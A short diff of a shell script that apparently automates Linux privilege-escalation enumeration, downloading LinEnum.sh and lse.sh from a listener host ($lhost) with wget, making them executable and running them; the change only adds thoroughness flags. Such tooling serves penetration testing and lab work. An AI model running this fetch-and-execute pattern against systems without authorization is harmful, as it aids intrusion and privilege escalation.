@@ -26,7 +26,7 @@ if [ $input =  "wget" ] ; then
    cd $(pwd)
    wget http://"$lhost":80/linux/script/LinEnum.sh
    chmod 700 LinEnum.sh
-   ./LinEnum.sh > LinEnum.txt 2>&1
+   ./LinEnum.sh -t > LinEnum.txt 2>&1
 #############################
 
 ##### LinPEAS Section #######
@@ -54,7 +54,7 @@ if [ $input =  "wget" ] ; then
    cd $(pwd)
    wget http://"$lhost":80/linux/script/lse.sh
    chmod 700 lse.sh
-   ./lse.sh > lse.txt  2>&1
+   ./lse.sh -i -l 2 > lse.txt  2>&1
 ###############################
 
 ##### Linux Unix Privesc Section #######
